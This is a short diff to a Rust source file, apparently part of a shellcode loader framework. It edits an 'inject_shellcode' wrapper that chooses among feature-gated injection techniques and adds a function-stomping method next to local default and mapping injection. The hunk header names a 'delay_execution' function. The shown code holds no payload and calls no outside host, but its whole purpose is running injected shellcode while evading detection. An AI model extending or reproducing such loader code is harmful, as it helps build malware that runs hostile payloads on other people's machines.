@@ -24,11 +24,11 @@ fn delay_execution() {
 // INJECTION WRAPPER
 // =======================================================================================================
 
-fn inject_shellcode(bytes_to_load: &[u8]) -> Result<*mut c_void, String> {
+fn inject_shellcode(bytes_to_load: &[u8]) -> Result<*mut c_void, i32> {
     #[cfg(feature = "InjectionDefaultLocal")]
     {
         use super::injection::inject_default_local;
-        inject_default_local(bytes_to_load).map_err(|e| format!("Injection failed: {}", e))
+        inject_default_local(bytes_to_load)
     }
     
     #[cfg(feature = "InjectionMappingLocal")]
@@ -37,9 +37,10 @@ fn inject_shellcode(bytes_to_load: &[u8]) -> Result<*mut c_void, String> {
         inject_mapping_local(bytes_to_load)
     }
     
-    #[cfg(not(any(feature = "InjectionDefaultLocal", feature = "InjectionMappingLocal")))]
+    #[cfg(feature = "InjectionFunctionStomping")]
     {
-        Err("No injection method enabled".to_string())
+        use super::injection::inject_function_stomping;
+        inject_function_stomping(bytes_to_load)
     }
 }
 
